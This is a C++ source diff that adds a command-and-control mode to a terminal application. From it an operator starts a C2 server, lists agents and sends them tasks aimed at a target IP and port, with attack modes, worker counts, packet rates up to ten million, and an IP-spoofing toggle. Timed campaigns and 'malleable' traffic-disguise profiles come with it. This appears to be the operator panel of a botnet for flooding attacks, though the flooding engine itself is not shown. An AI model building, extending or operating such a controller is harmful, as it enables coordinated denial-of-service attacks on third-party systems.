@@ -244,6 +244,7 @@ void refresh_runtime(ui::ApplicationSnapshot& snapshot,
     snapshot.settings_path = latest.settings_path;
     snapshot.interfaces = latest.interfaces;
     snapshot.events = latest.events;
+    snapshot.c2 = latest.c2;
 }
 
 void next_panel(ui::TuiState& state, bool reverse) {
@@ -258,6 +259,23 @@ void next_panel(ui::TuiState& state, bool reverse) {
     state.focus_panel = panel == 0 ? ui::FocusPanel::Configuration
                         : panel == 1 ? ui::FocusPanel::Actions
                                      : ui::FocusPanel::EventLog;
+}
+
+void next_c2_panel(ui::TuiState& state, bool reverse) {
+    int panel = 0;
+    switch (state.c2_focus) {
+        case ui::C2FocusPanel::ServerControl: panel = 0; break;
+        case ui::C2FocusPanel::AgentList: panel = 1; break;
+        case ui::C2FocusPanel::TaskDispatch: panel = 2; break;
+        case ui::C2FocusPanel::Campaigns: panel = 3; break;
+        case ui::C2FocusPanel::Malleable: panel = 4; break;
+    }
+    panel = reverse ? (panel + 4) % 5 : (panel + 1) % 5;
+    state.c2_focus = panel == 0 ? ui::C2FocusPanel::ServerControl
+                    : panel == 1 ? ui::C2FocusPanel::AgentList
+                    : panel == 2 ? ui::C2FocusPanel::TaskDispatch
+                    : panel == 3 ? ui::C2FocusPanel::Campaigns
+                                 : ui::C2FocusPanel::Malleable;
 }
 
 void start_edit(const ui::ApplicationSnapshot& snapshot, ui::TuiState& state) {
@@ -298,6 +316,12 @@ void close_modal(ui::TuiState& state) {
     state.input_mode = ui::InputMode::Navigation;
 }
 
+inline void sync_task_cursor(ui::TuiState& state);
+inline void sync_server_cursor(ui::TuiState& state);
+void adjust_c2_config(ui::TuiState& state, int direction);
+void start_c2_edit(ui::TuiState& state);
+bool commit_c2_edit(ui::TuiState& state);
+
 bool activate_action(ui::ApplicationSnapshot& snapshot, ui::TuiState& state,
                      app::ApplicationController& controller) {
     switch (state.selected_action) {
@@ -327,6 +351,422 @@ bool activate_action(ui::ApplicationSnapshot& snapshot, ui::TuiState& state,
     }
 }
 
+inline bool broadcast_current_task(ui::ApplicationSnapshot& snapshot, ui::TuiState& state,
+                                     app::ApplicationController& controller,
+                                     const std::string& agent_id = "") {
+    if (!snapshot.c2.server_running) {
+        state.error_message = "Start the server first.";
+        return true;
+    }
+    if (state.c2_target_buffer.empty()) {
+        state.error_message = "Enter a target IP.";
+        return true;
+    }
+    {
+        struct in_addr check_addr{};
+        if (inet_pton(AF_INET, state.c2_target_buffer.c_str(), &check_addr) != 1) {
+            state.error_message = "Invalid target IP address.";
+            return true;
+        }
+    }
+    if (state.c2_target_port == 0) {
+        state.error_message = "Port must be from 1 to 65535.";
+        return true;
+    }
+    if (state.c2_workers == 0 || state.c2_workers > 64) {
+        state.error_message = "Workers must be from 1 to 64.";
+        return true;
+    }
+    if (agent_id.empty()) {
+        controller.c2_broadcast_task(
+            state.c2_target_buffer, state.c2_target_port,
+            state.c2_mode_index, state.c2_workers, state.c2_rate,
+            state.c2_spoof);
+    } else {
+        controller.c2_send_task_to_agent(
+            agent_id, state.c2_target_buffer, state.c2_target_port,
+            state.c2_mode_index, state.c2_workers, state.c2_rate,
+            state.c2_spoof);
+    }
+    refresh_runtime(snapshot, controller.snapshot());
+    return true;
+}
+
+bool activate_c2_action(ui::ApplicationSnapshot& snapshot, ui::TuiState& state,
+                        app::ApplicationController& controller) {
+    if (state.c2_focus == ui::C2FocusPanel::ServerControl) {
+        sync_server_cursor(state);
+        const int action = state.c2_server_cursor - 2;
+        if (state.c2_server_cursor <= 1) {
+            start_c2_edit(state);
+            return true;
+        }
+        switch (action) {
+            case 0: {
+                if (snapshot.c2.server_running) {
+                    controller.c2_stop_server();
+                } else {
+                    std::uint16_t port = 7777;
+                    auto parsed = parse_u32(state.c2_port_buffer);
+                    if (parsed && *parsed > 0 && *parsed <= 65535)
+                        port = static_cast<std::uint16_t>(*parsed);
+                    else {
+                        state.error_message = "Invalid port. Enter a value from 1 to 65535.";
+                        return true;
+                    }
+                    controller.c2_start_server(port, state.c2_psk_buffer);
+                }
+                refresh_runtime(snapshot, controller.snapshot());
+                return true;
+            }
+            case 1: {
+                if (snapshot.c2.server_running) {
+                    auto port = snapshot.c2.server_port;
+                    auto psk = snapshot.c2.psk;
+                    controller.c2_stop_server();
+                    controller.c2_start_server(port, psk);
+                }
+                refresh_runtime(snapshot, controller.snapshot());
+                return true;
+            }
+            case 2: {
+                std::string script = controller.c2_install_script();
+                state.error_message = script.empty() ? "No script available" : "Script copied";
+                return true;
+            }
+            case 3:
+                state.tui_mode = ui::TuiMode::Local;
+                return true;
+            default: return true;
+        }
+    }
+
+    if (state.c2_focus == ui::C2FocusPanel::TaskDispatch) {
+        sync_task_cursor(state);
+        if (state.c2_task_cursor <= 5) {
+            // Text fields open the editor; toggles adjust directly.
+            if (state.c2_task_cursor == 0 || state.c2_task_cursor == 1 ||
+                state.c2_task_cursor == 3 || state.c2_task_cursor == 4) {
+                start_c2_edit(state);
+                return true;
+            }
+            adjust_c2_config(state, 1);
+            return true;
+        }
+        switch (state.c2_task_cursor - 6) {
+            case 0: {
+                return broadcast_current_task(snapshot, state, controller);
+            }
+            case 1: {
+                controller.c2_stop_task("");
+                refresh_runtime(snapshot, controller.snapshot());
+                return true;
+            }
+            case 2: {
+                state.tui_mode = ui::TuiMode::Local;
+                return true;
+            }
+            default: return true;
+        }
+    }
+
+    if (state.c2_focus == ui::C2FocusPanel::Campaigns) {
+        if (state.creating_campaign) {
+            if (state.campaign_selected_field >= 5) {
+                // Save: validate then create + start via backend.
+                if (state.campaign_target_buffer.empty()) {
+                    start_c2_edit(state);
+                    return true;
+                }
+                controller.c2_create_campaign(
+                    state.campaign_name_buffer, state.campaign_target_buffer,
+                    state.campaign_target_port, state.campaign_mode_index,
+                    state.campaign_workers, state.campaign_rate,
+                    state.campaign_duration);
+                state.creating_campaign = false;
+                state.campaign_editing = false;
+                refresh_runtime(snapshot, controller.snapshot());
+                return true;
+            }
+            start_c2_edit(state);
+            return true;
+        } else {
+            if (state.c2_campaign_selected == 0) {
+                state.creating_campaign = true;
+                state.campaign_name_buffer.clear();
+                state.campaign_target_buffer.clear();
+                state.campaign_selected_field = 0;
+                state.campaign_editing = false;
+                return true;
+            }
+        }
+        return true;
+    }
+
+    if (state.c2_focus == ui::C2FocusPanel::Malleable) {
+        if (state.creating_malleable) {
+            if (state.malleable_selected_field >= 3) {
+                if (state.malleable_name_buffer.empty()) {
+                    start_c2_edit(state);
+                    return true;
+                }
+                controller.c2_add_malleable(
+                    state.malleable_name_buffer, state.malleable_ua_buffer,
+                    state.malleable_uri_buffer, state.malleable_ct_buffer);
+                state.creating_malleable = false;
+                state.malleable_editing = false;
+                refresh_runtime(snapshot, controller.snapshot());
+                return true;
+            }
+            start_c2_edit(state);
+            return true;
+        } else {
+            if (state.c2_malleable_selected == static_cast<int>(snapshot.c2.malleable_profiles.size())) {
+                state.creating_malleable = true;
+                state.malleable_name_buffer.clear();
+                state.malleable_ua_buffer.clear();
+                state.malleable_uri_buffer.clear();
+                state.malleable_ct_buffer = "application/octet-stream";
+                state.malleable_selected_field = 0;
+                state.malleable_editing = false;
+                return true;
+            }
+        }
+        return true;
+    }
+
+    return true;
+}
+
+inline void sync_task_cursor(ui::TuiState& state) {
+    if (state.c2_task_cursor < 0) state.c2_task_cursor = 0;
+    if (state.c2_task_cursor > 8) state.c2_task_cursor = 8;
+    if (state.c2_task_cursor <= 5) {
+        state.c2_selected_field = state.c2_task_cursor;
+    } else {
+        state.c2_selected_task_action = state.c2_task_cursor - 6;
+    }
+}
+
+inline void sync_server_cursor(ui::TuiState& state) {
+    if (state.c2_server_cursor < 0) state.c2_server_cursor = 0;
+    if (state.c2_server_cursor > 5) state.c2_server_cursor = 5;
+    if (state.c2_server_cursor <= 1) {
+        state.c2_server_selected_field = state.c2_server_cursor;
+    } else {
+        state.c2_selected_task_action = state.c2_server_cursor - 2;
+    }
+}
+
+void adjust_c2_config(ui::TuiState& state, int direction) {
+    if (state.c2_focus != ui::C2FocusPanel::TaskDispatch) return;
+
+    const int field = state.c2_task_cursor <= 5 ? state.c2_task_cursor
+                                                : state.c2_selected_field;
+    const auto step = [direction](std::uint32_t value, std::uint32_t step_size,
+                                   std::uint32_t maximum) {
+        if (direction > 0) return value >= maximum ? maximum : value + step_size;
+        return value < step_size ? 0U : value - step_size;
+    };
+
+    switch (field) {
+        case 1:
+            state.c2_target_port = static_cast<std::uint16_t>(
+                step(state.c2_target_port, 1U, 65535));
+            if (state.c2_target_port == 0) state.c2_target_port = 1;
+            break;
+        case 2:
+            state.c2_mode_index = (state.c2_mode_index + direction + 7) % 7;
+            break;
+        case 3:
+            state.c2_workers = step(state.c2_workers, 1U, 64);
+            if (state.c2_workers == 0) state.c2_workers = 1;
+            break;
+        case 4:
+            state.c2_rate = step(state.c2_rate, 1000U, 10000000U);
+            break;
+        case 5:
+            state.c2_spoof = !state.c2_spoof;
+            break;
+        default:
+            break;
+    }
+}
+
+void start_c2_edit(ui::TuiState& state) {
+    // Map current cursor to an edit row. Text fields only.
+    if (state.c2_focus == ui::C2FocusPanel::ServerControl) {
+        if (state.c2_server_cursor == 0) {
+            state.edit_row = 100;
+            state.edit_buffer = state.c2_port_buffer;
+        } else if (state.c2_server_cursor == 1) {
+            state.edit_row = 101;
+            state.edit_buffer = state.c2_psk_buffer;
+        } else {
+            return;
+        }
+    } else if (state.c2_focus == ui::C2FocusPanel::TaskDispatch) {
+        if (state.c2_task_cursor == 0) {
+            state.edit_row = 200;
+            state.edit_buffer = state.c2_target_buffer;
+        } else if (state.c2_task_cursor == 1) {
+            state.edit_row = 201;
+            state.edit_buffer = std::to_string(state.c2_target_port);
+        } else if (state.c2_task_cursor == 3) {
+            state.edit_row = 203;
+            state.edit_buffer = std::to_string(state.c2_workers);
+        } else if (state.c2_task_cursor == 4) {
+            state.edit_row = 204;
+            state.edit_buffer = std::to_string(state.c2_rate);
+        } else {
+            return;
+        }
+    } else if (state.c2_focus == ui::C2FocusPanel::Campaigns) {
+        if (!state.creating_campaign) return;
+        static const std::string* fields[6] = {nullptr};
+        (void)fields;
+        state.edit_row = 300 + state.campaign_selected_field;
+        switch (state.campaign_selected_field) {
+            case 0: state.edit_buffer = state.campaign_name_buffer; break;
+            case 1: state.edit_buffer = state.campaign_target_buffer; break;
+            case 2: state.edit_buffer = std::to_string(state.campaign_target_port); break;
+            case 3: state.edit_buffer = std::to_string(state.campaign_workers); break;
+            case 4: state.edit_buffer = std::to_string(state.campaign_rate); break;
+            case 5: state.edit_buffer = std::to_string(state.campaign_duration); break;
+            default: return;
+        }
+    } else if (state.c2_focus == ui::C2FocusPanel::Malleable) {
+        if (!state.creating_malleable) return;
+        state.edit_row = 400 + state.malleable_selected_field;
+        switch (state.malleable_selected_field) {
+            case 0: state.edit_buffer = state.malleable_name_buffer; break;
+            case 1: state.edit_buffer = state.malleable_ua_buffer; break;
+            case 2: state.edit_buffer = state.malleable_uri_buffer; break;
+            case 3: state.edit_buffer = state.malleable_ct_buffer; break;
+            default: return;
+        }
+    } else {
+        return;
+    }
+    state.input_mode = ui::InputMode::Editing;
+    state.error_message.clear();
+}
+
+bool commit_c2_edit(ui::TuiState& state) {
+    const std::string& value = state.edit_buffer;
+    switch (state.edit_row) {
+        case 100: {
+            const auto parsed = parse_u32(value);
+            if (!parsed || *parsed == 0 || *parsed > 65535) {
+                state.error_message = "Port must be from 1 to 65535.";
+                return false;
+            }
+            state.c2_port_buffer = value;
+            break;
+        }
+        case 101: {
+            if (value.size() > 64) {
+                state.error_message = "PSK too long (max 64).";
+                return false;
+            }
+            state.c2_psk_buffer = value;
+            break;
+        }
+        case 200: {
+            struct in_addr addr{};
+            if (inet_pton(AF_INET, value.c_str(), &addr) != 1) {
+                state.error_message = "Invalid target IPv4 address.";
+                return false;
+            }
+            state.c2_target_buffer = value;
+            break;
+        }
+        case 201: {
+            const auto parsed = parse_u32(value);
+            if (!parsed || *parsed == 0 || *parsed > 65535) {
+                state.error_message = "Port must be from 1 to 65535.";
+                return false;
+            }
+            state.c2_target_port = static_cast<std::uint16_t>(*parsed);
+            break;
+        }
+        case 203: {
+            const auto parsed = parse_u32(value);
+            if (!parsed || *parsed == 0 || *parsed > 64) {
+                state.error_message = "Workers must be from 1 to 64.";
+                return false;
+            }
+            state.c2_workers = *parsed;
+            break;
+        }
+        case 204: {
+            const auto parsed = parse_u32(value);
+            if (!parsed) {
+                state.error_message = "Rate must be an unsigned integer.";
+                return false;
+            }
+            state.c2_rate = *parsed;
+            break;
+        }
+        case 300: state.campaign_name_buffer = value.substr(0, 64); break;
+        case 301: {
+            if (!value.empty()) {
+                struct in_addr addr{};
+                if (inet_pton(AF_INET, value.c_str(), &addr) != 1) {
+                    state.error_message = "Invalid campaign target IP.";
+                    return false;
+                }
+            }
+            state.campaign_target_buffer = value;
+            break;
+        }
+        case 302: {
+            const auto parsed = parse_u32(value);
+            if (!parsed || *parsed == 0 || *parsed > 65535) {
+                state.error_message = "Port must be from 1 to 65535.";
+                return false;
+            }
+            state.campaign_target_port = static_cast<std::uint16_t>(*parsed);
+            break;
+        }
+        case 303: {
+            const auto parsed = parse_u32(value);
+            if (!parsed || *parsed == 0 || *parsed > 64) {
+                state.error_message = "Workers must be from 1 to 64.";
+                return false;
+            }
+            state.campaign_workers = *parsed;
+            break;
+        }
+        case 304: {
+            const auto parsed = parse_u32(value);
+            if (!parsed) {
+                state.error_message = "Rate must be an unsigned integer.";
+                return false;
+            }
+            state.campaign_rate = *parsed;
+            break;
+        }
+        case 305: {
+            const auto parsed = parse_u32(value);
+            if (!parsed || *parsed > 86400) {
+                state.error_message = "Duration must be 0-86400.";
+                return false;
+            }
+            state.campaign_duration = *parsed;
+            break;
+        }
+        case 400: state.malleable_name_buffer = value.substr(0, 64); break;
+        case 401: state.malleable_ua_buffer = value.substr(0, 200); break;
+        case 402: state.malleable_uri_buffer = value.substr(0, 200); break;
+        case 403: state.malleable_ct_buffer = value.substr(0, 100); break;
+        default: return false;
+    }
+    state.error_message.clear();
+    state.input_mode = ui::InputMode::Navigation;
+    return true;
+}
+
 bool handle_edit_event(ui::ApplicationSnapshot& snapshot, ui::TuiState& state, const Event& event) {
     if (event == Event::Escape) {
         state.input_mode = ui::InputMode::Navigation;
@@ -334,6 +774,15 @@ bool handle_edit_event(ui::ApplicationSnapshot& snapshot, ui::TuiState& state, c
         return true;
     }
     if (event == Event::Return) {
+        if (state.tui_mode == ui::TuiMode::C2Server && state.edit_row == -1) {
+            state.input_mode = ui::InputMode::Navigation;
+            state.error_message.clear();
+            return true;
+        }
+        if (state.tui_mode == ui::TuiMode::C2Server && state.edit_row >= 100) {
+            commit_c2_edit(state);
+            return true;
+        }
         commit_edit(snapshot, state);
         return true;
     }
@@ -456,6 +905,11 @@ int run(int argc, char** argv) {
                 std::cerr << "Snapshot dimensions must be at least 20x10\n";
                 return 2;
             }
+            if (*width > static_cast<std::uint32_t>(std::numeric_limits<int>::max()) ||
+                *height > static_cast<std::uint32_t>(std::numeric_limits<int>::max())) {
+                std::cerr << "Snapshot dimensions too large\n";
+                return 2;
+            }
             return snapshot_main(static_cast<int>(*width), static_cast<int>(*height));
         }
     }
@@ -470,6 +924,9 @@ int run(int argc, char** argv) {
         auto controller = app::create_application_controller(std::move(config));
         ui::ApplicationSnapshot snapshot = controller->snapshot();
         ui::TuiState state;
+        // Pre-fill server fields from persisted server config (never empty).
+        state.c2_port_buffer = std::to_string(snapshot.c2.server_port);
+        state.c2_psk_buffer = snapshot.c2.psk;
 
         auto screen = ScreenInteractive::Fullscreen();
         auto component = Renderer([&] {
@@ -483,9 +940,20 @@ int run(int argc, char** argv) {
                 refresh_runtime(snapshot, controller->snapshot());
                 return true;
             }
-            if (event == Event::CtrlC || event == Event::Character('q') ||
-                event == Event::Character('Q')) {
-                screen.Exit();
+
+            // Global mode switch: F2 = Local, F3 = C2Server
+            if (event == Event::F2) {
+                state.tui_mode = ui::TuiMode::Local;
+                state.error_message.clear();
+                return true;
+            }
+            if (event == Event::F3) {
+#ifdef QEVORYX_ENABLE_C2
+                state.tui_mode = ui::TuiMode::C2Server;
+                state.error_message.clear();
+#else
+                state.error_message = "C2 server not included in this build.";
+#endif
                 return true;
             }
 
@@ -494,11 +962,207 @@ int run(int argc, char** argv) {
             if (state.input_mode == ui::InputMode::Modal)
                 return handle_modal_event(snapshot, state, *controller, event);
 
+            if (event == Event::CtrlC || event == Event::Character('q') ||
+                event == Event::Character('Q')) {
+                screen.Exit();
+                return true;
+            }
+
             if (event == Event::Escape) {
+                if (state.creating_campaign) {
+                    state.creating_campaign = false;
+                    return true;
+                }
+                if (state.creating_malleable) {
+                    state.creating_malleable = false;
+                    return true;
+                }
                 state.show_help = false;
                 state.error_message.clear();
                 return true;
             }
+
+            // ── C2 Server Mode keyboard ──
+            if (state.tui_mode == ui::TuiMode::C2Server) {
+                if (event == Event::Tab || event == Event::TabReverse) {
+                    next_c2_panel(state, event == Event::TabReverse);
+                    return true;
+                }
+                if (event == Event::ArrowDown) {
+                    if (state.c2_focus == ui::C2FocusPanel::ServerControl) {
+                        state.c2_server_cursor =
+                            (state.c2_server_cursor + 1) % view::c2_server_cursor_count;
+                        sync_server_cursor(state);
+                    } else if (state.c2_focus == ui::C2FocusPanel::TaskDispatch) {
+                        state.c2_task_cursor =
+                            (state.c2_task_cursor + 1) % view::c2_task_cursor_count;
+                        sync_task_cursor(state);
+                    } else if (state.c2_focus == ui::C2FocusPanel::AgentList) {
+                        if (!snapshot.c2.agents.empty())
+                            state.c2_selected_agent = (state.c2_selected_agent + 1) %
+                                static_cast<int>(snapshot.c2.agents.size());
+                    } else if (state.c2_focus == ui::C2FocusPanel::Campaigns) {
+                        if (state.creating_campaign) {
+                            state.campaign_selected_field = (state.campaign_selected_field + 1) % 6;
+                        } else {
+                            state.c2_campaign_selected = (state.c2_campaign_selected + 1) % 2;
+                        }
+                    } else if (state.c2_focus == ui::C2FocusPanel::Malleable) {
+                        if (state.creating_malleable) {
+                            state.malleable_selected_field = (state.malleable_selected_field + 1) % 4;
+                        } else {
+                            int total = static_cast<int>(snapshot.c2.malleable_profiles.size()) + 1;
+                            if (total > 0)
+                                state.c2_malleable_selected = (state.c2_malleable_selected + 1) % total;
+                        }
+                    }
+                    return true;
+                }
+                if (event == Event::ArrowUp) {
+                    if (state.c2_focus == ui::C2FocusPanel::ServerControl) {
+                        state.c2_server_cursor =
+                            (state.c2_server_cursor + view::c2_server_cursor_count - 1) %
+                            view::c2_server_cursor_count;
+                        sync_server_cursor(state);
+                    } else if (state.c2_focus == ui::C2FocusPanel::TaskDispatch) {
+                        state.c2_task_cursor =
+                            (state.c2_task_cursor + view::c2_task_cursor_count - 1) %
+                            view::c2_task_cursor_count;
+                        sync_task_cursor(state);
+                    } else if (state.c2_focus == ui::C2FocusPanel::AgentList) {
+                        if (!snapshot.c2.agents.empty())
+                            state.c2_selected_agent = (state.c2_selected_agent +
+                                static_cast<int>(snapshot.c2.agents.size()) - 1) %
+                                static_cast<int>(snapshot.c2.agents.size());
+                    } else if (state.c2_focus == ui::C2FocusPanel::Campaigns) {
+                        if (state.creating_campaign) {
+                            state.campaign_selected_field = (state.campaign_selected_field + 5) % 6;
+                        } else {
+                            state.c2_campaign_selected = (state.c2_campaign_selected + 1) % 2;
+                        }
+                    } else if (state.c2_focus == ui::C2FocusPanel::Malleable) {
+                        if (state.creating_malleable) {
+                            state.malleable_selected_field = (state.malleable_selected_field + 3) % 4;
+                        } else {
+                            int total = static_cast<int>(snapshot.c2.malleable_profiles.size()) + 1;
+                            if (total > 0)
+                                state.c2_malleable_selected = (state.c2_malleable_selected + total - 1) % total;
+                        }
+                    }
+                    return true;
+                }
+                if (event == Event::ArrowLeft || event == Event::ArrowRight) {
+                    const int dir = event == Event::ArrowRight ? 1 : -1;
+                    if (state.c2_focus == ui::C2FocusPanel::TaskDispatch) {
+                        if (state.c2_task_cursor <= 5) adjust_c2_config(state, dir);
+                    } else if (state.c2_focus == ui::C2FocusPanel::Campaigns && state.creating_campaign) {
+                        if (state.campaign_selected_field == 2) {
+                            int v = static_cast<int>(state.campaign_target_port) + dir;
+                            if (v < 1) v = 1;
+                            if (v > 65535) v = 65535;
+                            state.campaign_target_port = static_cast<std::uint16_t>(v);
+                        }
+                    }
+                    return true;
+                }
+                if (event == Event::Character(' ')) {
+                    if (state.c2_focus == ui::C2FocusPanel::TaskDispatch) {
+                        if (state.c2_task_cursor == 2 || state.c2_task_cursor == 5)
+                            adjust_c2_config(state, 1);
+                    }
+                    return true;
+                }
+                if (event == Event::Return) {
+                    if (!activate_c2_action(snapshot, state, *controller)) {
+                        screen.Exit();
+                    }
+                    return true;
+                }
+                if (event == Event::Character('?')) {
+                    state.show_help = !state.show_help;
+                    return true;
+                }
+                if (event == Event::Character('i') || event == Event::Character('I')) {
+                    std::string script = controller->c2_install_script();
+                    if (!script.empty()) {
+                        state.error_message = "Install script available (check logs)";
+                    }
+                    return true;
+                }
+                if (event == Event::Character('g') || event == Event::Character('G')) {
+                    if (state.c2_focus == ui::C2FocusPanel::AgentList &&
+                        !snapshot.c2.agents.empty()) {
+                        state.agent_assign_mode = !state.agent_assign_mode;
+                        state.error_message = state.agent_assign_mode
+                            ? "Targeted mode: A sends to selected agent."
+                            : "Broadcast mode: A sends to idle agents.";
+                    }
+                    return true;
+                }
+                if (event == Event::Character('a') || event == Event::Character('A')) {
+                    if (state.agent_assign_mode &&
+                        state.c2_focus == ui::C2FocusPanel::AgentList &&
+                        !snapshot.c2.agents.empty() &&
+                        state.c2_selected_agent >= 0 &&
+                        state.c2_selected_agent < static_cast<int>(snapshot.c2.agents.size())) {
+                        const auto& ag = snapshot.c2.agents[static_cast<std::size_t>(
+                            state.c2_selected_agent)];
+                        broadcast_current_task(snapshot, state, *controller, ag.id);
+                    } else {
+                        broadcast_current_task(snapshot, state, *controller);
+                    }
+                    return true;
+                }
+                if (event == Event::Character('t') || event == Event::Character('T')) {
+                    if (state.agent_assign_mode &&
+                        state.c2_focus == ui::C2FocusPanel::AgentList &&
+                        !snapshot.c2.agents.empty() &&
+                        state.c2_selected_agent >= 0 &&
+                        state.c2_selected_agent < static_cast<int>(snapshot.c2.agents.size())) {
+                        const auto& ag = snapshot.c2.agents[static_cast<std::size_t>(
+                            state.c2_selected_agent)];
+                        controller->c2_stop_task(ag.id);
+                    } else {
+                        controller->c2_stop_task("");
+                    }
+                    refresh_runtime(snapshot, controller->snapshot());
+                    return true;
+                }
+                if (event == Event::PageUp) {
+                    state.event_log_offset += 5;
+                    return true;
+                }
+                if (event == Event::PageDown) {
+                    if (state.event_log_offset >= 5) state.event_log_offset -= 5;
+                    else state.event_log_offset = 0;
+                    return true;
+                }
+                if (event == Event::Character('x') || event == Event::Character('X')) {
+                    if (state.c2_focus == ui::C2FocusPanel::ServerControl) {
+                        controller->c2_stop_server();
+                        refresh_runtime(snapshot, controller->snapshot());
+                    }
+                    return true;
+                }
+                if (event == Event::Character('s') || event == Event::Character('S')) {
+                    if (state.c2_focus == ui::C2FocusPanel::ServerControl) {
+                        std::uint16_t port = 7777;
+                        auto parsed = parse_u32(state.c2_port_buffer);
+                        if (parsed && *parsed > 0 && *parsed <= 65535)
+                            port = static_cast<std::uint16_t>(*parsed);
+                        else {
+                            state.error_message = "Invalid port. Enter a value from 1 to 65535.";
+                            return true;
+                        }
+                        controller->c2_start_server(port, state.c2_psk_buffer);
+                        refresh_runtime(snapshot, controller->snapshot());
+                    }
+                    return true;
+                }
+                return true;
+            }
+
+            // ── Local Mode keyboard ──
             if (event == Event::Tab || event == Event::TabReverse) {
                 next_panel(state, event == Event::TabReverse);
                 return true;
